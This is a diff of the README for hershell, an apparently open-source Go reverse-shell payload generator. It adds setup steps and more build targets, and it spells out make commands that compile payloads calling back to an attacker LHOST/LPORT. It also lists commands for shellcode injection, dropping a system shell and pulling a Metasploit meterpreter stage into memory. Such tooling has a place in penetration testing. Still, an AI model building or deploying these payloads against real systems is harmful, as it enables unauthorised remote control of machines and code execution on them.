@@ -21,6 +21,13 @@ The goal of this project is to get a simple reverse shell, which can work on mul
 
 Since it's written in Go, you can cross compile the source for the desired architecture.
 
+## Getting started & dependencies
+
+As this is a Go project, you will need to follow the [official documentation](https://golang.org/doc/install) to set up
+your Golang environment (with the `$GOPATH` environment variable).
+
+Then, just run `go get github.com/lesnuages/hershell` to fetch the project.
+
 ### Building the payload
 
 To simplify things, you can use the provided Makefile.
@@ -40,7 +47,8 @@ However, some helper targets are available in the ``Makefile``:
 - ``windows64`` : builds a windows 64 bits executable (PE 64 bits)
 - ``linux32`` : builds a linux 32 bits executable (ELF 32 bits)
 - ``linux64`` : builds a linux 64 bits executable (ELF 64 bits)
-- ``macos`` : builds a mac os 64 bits executable (Mach-O)
+- ``macos32`` : builds a mac os 32 bits executable (Mach-O)
+- ``macos64`` : builds a mac os 64 bits executable (Mach-O)
 
 For those targets, you just need to set the ``LHOST`` and ``LPORT`` environment variables.
 
@@ -53,7 +61,7 @@ The following special commands are supported:
 
 * ``run_shell`` : drops you an system shell (allowing you, for example, to change directories)
 * ``inject <base64 shellcode>`` : injects a shellcode (base64 encoded) in the same process memory, and executes it (Windows only at the moment).
-* ``meterpreter [tcp|http|https] IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp meterpreter from metasploit, and execute the shellcode in memory (Windows only at the moment)
+* ``meterpreter [tcp|http|https] IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp, http or https meterpreter from metasploit, and execute the shellcode in memory (Windows only at the moment)
 * ``exit`` : exit gracefully
 
 ## Usage
@@ -73,18 +81,18 @@ cat server.key >> server.pem
 For windows:
 
 ```bash
-# Custom target
-$ make GOOS=windows GOARCH=amd64 LHOST=192.168.0.12 LPORT=1234
-# Predifined target
+# Predifined 32 bit target
 $ make windows32 LHOST=192.168.0.12 LPORT=1234
+# Predifined 64 bit target
+$ make windows64 LHOST=192.168.0.12 LPORT=1234
 ```
 
 For Linux:
 ```bash
-# Custom target
-$ make GOOS=linux GOARCH=amd64 LHOST=192.168.0.12 LPORT=1234
-# Predifined target
+# Predifined 32 bit target
 $ make linux32 LHOST=192.168.0.12 LPORT=1234
+# Predifined 64 bit target
+$ make linux64 LHOST=192.168.0.12 LPORT=1234
 ```
 
 For Mac OS X
